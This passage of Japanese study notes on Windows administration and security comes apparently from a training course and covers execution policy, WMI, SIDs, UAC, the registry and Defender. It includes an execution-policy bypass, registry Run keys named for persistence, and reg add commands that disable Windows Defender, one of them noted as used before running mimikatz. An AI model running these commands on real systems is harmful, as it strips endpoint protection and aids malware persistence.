| **AllSigned**   | **すべてのスクリプトが信頼された発行元によって署名されている必要**があります。プロンプトが表示されることがあります。                  | 符号付きでも悪意のあるスクリプトを実行する可能性があります。                                            |
| **Bypass**      | **何もブロックされず、警告やプロンプトも表示されません**。大規模なアプリケーションや独自のセキュリティモデルを持つ構成に使用されます。 | 全くの無制限のため、悪意のあるスクリプトが実行されるリスクがあります。                                   |
| **Default**     | 既定の実行ポリシーを設定します。**Windows クライアントは Restricted、Windows サーバーは RemoteSigned **です。                     | 各プラットフォームに応じた適切な既定の制限が適用されます。                                               |
| **RemoteSigned**| **インターネットからダウンロードされたスクリプトには信頼できる発行者の署名が必要**です。**ローカルのスクリプトには署名は不要**です。     | 符号なしや悪意のある符号付きスクリプトが実行されるリスクがあります。                                    |
| **Restricted**  | 個々のコマンドは許可されますが、スクリプトの実行は許可されません。Windows クライアントの既定のポリシーです。                  | スクリプトの実行が全てブロックされるため、スクリプトによる自動化が制限されます。                         |
| **Undefined**   | 実行ポリシーが設定されていません。すべてのスコープで Undefined の場合は、Windows クライアントでは **Restricted**、Windows Server では **RemoteSigned** になります。 | 特定の実行ポリシーがないため、プラットフォームに応じた既定のポリシーが適用されます。                    |
| **Unrestricted**| 符号なしスクリプトも実行可能です。Windows 以外のコンピューターでは既定のポリシーです。ローカルイントラネット以外では警告が表示されます。 | 悪意のあるスクリプトが実行されるリスクが高まります。                                                     |

* 実行ポリシーのスコープ

| スコープ         | 説明  |
|------------------|---------------------------------------------------------------------------------------------------------|
| **MachinePolicy** | グループポリシーによってコンピューターのすべてのユーザーに対して設定されます。|
| **UserPolicy**    | グループポリシーによってコンピューターの現在のユーザーに対して設定されます。 |
| **Process**       | 現在の PowerShell セッションのみに影響します。 実行ポリシーは環境変数 `$env:PSExecutionPolicyPreference` に保存され、セッション終了時に削除されます。 |
| **CurrentUser**   | 実行ポリシーは現在のユーザーのみに影響します。HKEY_CURRENT_USER レジストリ サブキーに格納されています。|
| **LocalMachine**  | 実行ポリシーはコンピューターのすべてのユーザーに影響します。HKEY_LOCAL_MACHINE レジストリ サブキーに格納されています。|

* 実行ポリシーの確認
> ```
> Get-ExecutionPolicy -List
> ```

* 実行ポリシーの変更
> ```
> Set-ExecutionPolicy Bypass -Scope Process
> ```

##### 実行ポリシーの実際問題
ユーザーの操作を制限するセキュリティ制御ではないよ。以下の方法で簡単に回避できてしまう
* スクリプトをダウンロードして呼び出す。
* スクリプトをエンコードされたコマンドとして指定して実行
* 実行ポリシーを調整する (ユーザーに適切な権限がある場合)

## (3) WMI (Windows Management Instrumentation)
WMI は PowerShell のサブシステムであり、システム管理者にシステム監視用の強力なツールを提供するよ。
* WMIの目的
> ```
> 企業ネットワーク全体でデバイスとアプリケーションの管理を統合すること。
>
> 具体的には、いろんな監視や、システム設定、ソフトウェアのインストールと管理を一括してWMIで管理できるようにするってこと
> ```
* Windows 2000 以降にプリインストールされてるよ
* ドメインの中で管理しているユーザに侵入できたらWMIとかでいろいろ弄繰り回せるってこと

### ① WMIのコンポーネント
| コンポーネント名            | 説明 |
|--------------------------|--------------------------------------------------------------------------------------|
| WMIサービス              | Windows Management Instrumentationプロセスで、起動時に自動的に実行され、WMIプロバイダー、WMIリポジトリ、管理アプリケーションの間の仲介役を果たします。|
| 管理対象オブジェクト        | WMIによって管理される論理的または物理的なコンポーネントです。|
| WMIプロバイダー           | 特定のオブジェクトに関連するイベントやデータを監視するオブジェクトです。|
| クラス                    | WMIプロバイダーがデータをWMIサービスに渡すために使用されるものです。|
| メソッド                  | クラスに関連付けられ、アクションを実行できるようにします。たとえば、メソッドを使用してリモートマシン上のプロセスを開始または停止できます。|
| WMIリポジトリ             | WMIに関連するすべての静的データを格納するデータベースです。|
| CIMオブジェクトマネージャー | WMIプロバイダーからデータを要求し、それを要求しているアプリケーションに返すシステムです。|
| WMI API                  | アプリケーションがWMIインフラストラクチャにアクセスすることを可能にします。|
| WMIコンシューマ            | CIMオブジェクトマネージャーを介してオブジェクトにクエリを送信します。|

### ② WMIの用途(機能)
* ローカル/リモートシステムのステータス情報
* リモートマシン/アプリケーションのセキュリティ設定の構成
* ユーザーとグループの権限の設定と変更
* システムプロパティの設定/変更
* コード実行 ⇒ 横展開、マルウェア等の展開に使える
* プロセスのスケジュール ⇒ 横展開、マルウェア等の展開に使える
* ログの設定

#### WMIによるSIDの情報の参照
wmicを利用すると簡単に、マシン上の情報を集められる!!!
> `wmic useraccount get name, sid`
* 細かい設定とかは、大体wmicで検索できるし、操作できる
### ③ WSL
WSLは、Windows 10 および Windows Server 2019 で Linux バイナリをネイティブに実行できるようにする機能。
便利だよ。だけどちょっとネットワーク系が面倒、nmapとかWSLからやると不具合があったりする。

# 6 Windos セキュリティ
## (1) セキュリティ識別子(SID)
システム上の各セキュリティ プリンシパル(ユーザとかグループ)には、一意のセキュリティ識別子 (SID) があるよ

### ① SIDの形式
> ```
> S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-YYYY
> ```

1. `S` - SIDは必ず"S"で始まります（"S"は「SID」を意味します）。
2. `1` - リビジョンレベル。これは常に "1" です。
3. `5` - 権限値を示します。Windows NTのセキュリティ領域を表す番号で、通常は "5" です。
4. `21` - ドメインまたはローカルコンピュータの識別子を示す値です。SIDが複数のコンポーネントに分かれている場合はこの値になります。
5. `XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX` - ドメインやコンピュータに固有の識別子です。3つの部分に分かれ、各部分は10桁の数字で表示されます。
6. `YYYY` - ユーザーやグループなどのオブジェクトを特定するための相対識別子 (RID) です。

## (2) セキュリティアカウントマネージャ(SAM)とアクセス制御エントリ(ACE)
* SAM - ネットワークに特定のプロセスを実行する権限を付与するよ(ローカルの資格情報を管理しているよ)
* ACE -アクセス権自体は、アクセス制御リスト (ACL) 内のアクセス制御エントリ (ACE) によって管理されます。ACL には、たとえば、どのユーザー、グループ、またはプロセスがファイルにアクセスしたり、プロセスを実行したりできるかを定義する
## (3) ユーザアカウント制御(UAC)
* ユーザー アカウント制御 (UAC)は、マルウェアがコンピューターやそのコンテンツに損害を与える可能性のあるプロセスを実行したり操作したりするのを防ぐための Windows のセキュリティ機能
* Administrators権限を持っていても管理者の権限の実行をするとき表示されるあれ
![image](https://github.com/user-attachments/assets/e5788580-c5c3-4d6d-8bff-7d4d0ae643a9)
* ビルトインのAdministratorユーザだとデフォルトでUACは、無効になっているよ。
* こいつのせいで、プロンプトからの権限昇格が難しくなっているよ。(RDPでつなげられればめっちゃ楽(Administratorsに入ってればの話))

### ① UACの状態を確認

## (4) レジストリ
レジストリは、システムの設定値だよ。こいつをいじることで、永続化もできるし、Defender止めたりとか、リアルタイムスキャンとか、ウイルス対策ソフトとか、UACとかも無効化したりできるよ。

* いろんな操作の跡が残るところでもあるんだ - https://www.nri-secure.co.jp/hubfs/SANS/download/DFPS_FOR500_v4.7_1-19_JP.pdf
* CURRENT_USER配下のレジストリは、各ユーザ権限で操作できる。
* LOCAL MACHINE配下は、管理者権限が必要
* reg.exeを利用して操作できるし、"C:\Windows\regedit.exe"を使用してGUIで操作できるよ

### ① reg.exeの基本
* よく使うオプション
  * `/v` - 値の名前をさす
  * `/d` - データをさす(文字、または、16進数のバイナリ)
  * `/t` - タイプをさす(REG_DWORD,REG_LINK...)
  * `/f` - 最終確認をせずに実行
* レジストリの値を検索(query)
> ```
> reg query "%reg-key-path%" /v "%value-name%"
> ```
* レジストリの値を上書き、追加(どちらもaddで行う)
> ```
> reg add "%reg-key-path%" /v "%value-name%" /d "%data%" /t %type% /f
> ```
* レジストリの値の削除(delete)
> ```
> reg delete reg "%reg-key-path%" /v "%value-name%"
> ```


#### レジストリのタイプ
| Value                      | Type                                                                                                                 |
|----------------------------|----------------------------------------------------------------------------------------------------------------------|
| **REG_BINARY**              | 任意の形式のバイナリデータ。                                                                                          |
| **REG_DWORD**               | 32ビットの数値。                                                                                                     |
| **REG_DWORD_LITTLE_ENDIAN** | リトルエンディアン形式の32ビットの数値。Windowsはリトルエンディアンのコンピュータアーキテクチャで動作するように設計されています。そのため、この値はWindowsのヘッダーファイルでREG_DWORDとして定義されています。 |
| **REG_DWORD_BIG_ENDIAN**    | ビッグエンディアン形式の32ビットの数値。一部のUNIXシステムはビッグエンディアンアーキテクチャをサポートしています。                             |
| **REG_EXPAND_SZ**           | 環境変数への未展開の参照を含むヌル終端文字列（例: "%PATH%"）。UnicodeまたはANSI文字列であり、使用する関数に応じて異なります。環境変数の参照を展開するには、ExpandEnvironmentStrings関数を使用します。 |
| **REG_LINK**                | REG_OPTION_CREATE_LINKでRegCreateKeyEx関数を呼び出すことにより作成されたシンボリックリンクのターゲットパスを含むヌル終端のUnicode文字列。 |
| **REG_MULTI_SZ**            | ヌル終端の文字列のシーケンスで、空の文字列（\0）で終了します。次の例を参照してください: String1\0String2\0String3\0LastString\0\0。最初の\0は最初の文字列を終了し、最後から2番目の\0は最後の文字列を終了し、最後の\0はシーケンスを終了します。最後の終端子は文字列の長さに含める必要があります。 |
| **REG_NONE**                | 定義された値の型がありません。                                                                                      |
| **REG_QWORD**               | 64ビットの数値。                                                                                                     |
| **REG_QWORD_LITTLE_ENDIAN** | リトルエンディアン形式の64ビットの数値。Windowsはリトルエンディアンのコンピュータアーキテクチャで動作するように設計されています。そのため、この値はWindowsのヘッダーファイルでREG_QWORDとして定義されています。 |
| **REG_SZ**                  | ヌル終端文字列。これは、使用するUnicodeまたはANSI関数に応じて、UnicodeまたはANSI文字列になります。                              |


### ② 永続化に利用されるレジストリ
* CURRENT_USER(各ユーザごとにあるregistoryのやつ) - ユーザログイン時または、中に有効
> ```
> HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\ 配下の
> Run, RunOnce, RunServices, RunServices On, RunServicesOnce
> Policies\Explorer\Run
> 
> ※これで実行されるプログラムの権限は、このレジストリを持つユーザの権限で実行される
> ```

* LOCAL MACHINE(マシン用のregistoryのやつ) - マシン起動時または、中に有効
> ```
> HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ 配下の
> Run, RunOnce, RunServices, Policies\Explorer\Run,
> Explorer\SharedTaskScheduler
> 
> ※これで実行されるプログラムの権限は、SYSTEN権限やサービス権限で実行される。基本的には、管理者権限で実行される。
> ```

### ③ Windows Defenderの無効化(Windows 11では使えない)
* レジストリで実行されなくする
> ```
> reg add “HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender” /v “DisableAntiSpyware” /d “1” /t REG_DWORD /f
> この後、再起動が必要
> ```

* リアルタイム保護のみを無効化にする(mimikatzとかのマルウェアをインストールして実行するときにやる)
> ```
> reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /d "1" /t REG_DWORD /f
> ```

## (5) アプリケーションのホワイトリスト
* アプリケーション ホワイトリストは、システム上で存在および実行が許可されている承認済みのソフトウェア アプリケーションまたは実行可能ファイルのリスト
* 目的は、有害なマルウェアや、組織の特定のビジネス ニーズに合わない未承認のソフトウェアから環境を保護すること
* 組織は、最初に監査モードでホワイトリストを実装して、必要なすべてのアプリケーションがホワイトリストに登録され、省略エラーによってブロックされていないことを確認する必要があります。省略エラーによってブロックされると、解決するよりも多くの問題が発生する可能性がある。
* ゼロトラストの原則でもあるよ
* ブラックリストと違って、新しい悪意のあるアプリケーションを登録しなくていいから「作れれば」維持は楽

### ① AppLocker
* Microsoft のアプリケーション ホワイトリスト ソリューション
* 実行可能ファイル、スクリプト、Windows インストーラー ファイル、DLL、パッケージ化されたアプリ、パックされたアプリ インストーラーを詳細に制御できる。
* 発行元の名前 (デジタル署名から取得可能)、製品名、ファイル名、バージョンなどのファイル属性に基づいてルールを作成できる。

### ② ローカルグループポリシー
* グループ ポリシーを使用すると、管理者はさまざまな設定を設定、構成、調整できる。
* ドメイン環境では、グループ ポリシーは、グループ ポリシー オブジェクト (GPO) がリンクされているすべてのドメイン参加マシンにドメイン コントローラからプッシュダウンされる。
* ローカル グループ ポリシーを使用して個々のマシンで定義することもできる
* 「Win + R」 - gpedit.mscを実行すると設定できる
* Hom Editionには含まれていない
* ローカル グループ ポリシーを調べて、Windows システムをロックダウンするために使用できるさまざまな方法について学習することは価値があるよ。

## (6) Windows Defender
* 既知の脅威からデバイスをリアルタイムで保護するリアルタイム保護や、自動サンプル送信と連携して疑わしいファイルをアップロードして分析するクラウド配信保護などの機能がある。
* クラウド保護サービスにファイルが送信されると、分析が完了するまで悪意のある可能性のある動作を防ぐために、ファイルは「ロック」されるよ。
* リアルタイム保護、スマートスクリーン(webブラウザでWebからとってきたやつをスキャンする)などがうざいよ
* Windows10までは、レジストリをいじるので無効化できたけど、Windows11からセーフモードからでしか無効化できなくなったよ。
* Windows Defenderの状況を確認(Powershell)
> ```
> Get-MpComputerStatus
> ```

### ① 問題
#### bob.smithユーザのSID
wmicでユーザの情報を調べるのでこれを使用して見つけた
> ```
> wmic useraccount get name, sid
> ```

* 解説のやつ
> ```
> Get-WmiObject -Class Win32_Account -Filter "Name='bob.smith'"
> ```

#### 現在のユーザーの起動時に無効になっているサードパーティのセキュリティ アプリケーションは何ですか? (回答は大文字と小文字が区別されます)。
1. アプリケーションなので「Program Files(x86)」、「Program Files」を確認(どのようなアプリケーションがダウンロードされているか調べるため」
![image](https://github.com/user-attachments/assets/68d6c214-5524-41a7-85f0-fbec20857322)
> Node VPNくらいしか、サードパーティのセキュリティっぽいのがないのでこれを狙ってみる
2. Node VPNについて調べる
![image](https://github.com/user-attachments/assets/ba840188-64d4-4d29-8d02-681a6bb3ac5d)
3. Windowsの設定ホーム⇒「App」 ⇒ 「setup」を確認
![image](https://github.com/user-attachments/assets/427f4486-58e9-4472-b29e-a780fae7856b)
> Node VPNの起動が無効になっていた。

こたえは、あってた。

* 解説のやつ(\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Runに起動しないようにする設定があるらしい)
> ```
> Reg Query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run"
> ``
> 普通に知らなかった。ちなみに、...\CurrentVersion\Runにも登録されていた。
> そこに登録されていてもこっちの起動しないようにする設定が勝つんだなぁ
> ```

# 最後のスキルチャレンジ(参考になったやつのみ)
## User、groupの作成
* User - `net user %user-name% /add`
* Group(local) - `net localgroup %group-name% /add`
* Group(Domain) - `net group %group-name% /add`

## Winows Updateに関連付けられているサービスは、何
1. scコマンドのhelpを確認
![image](https://github.com/user-attachments/assets/0fdddd9a-3015-409a-964e-c2db59267d1b)
> 使えそうなものがあった(GetKeyName)
2. sc GetKeyName "Windows Update"を実行
![image](https://github.com/user-attachments/assets/5936fd25-1ec4-40da-bf9f-93366328ee98)
> いけた

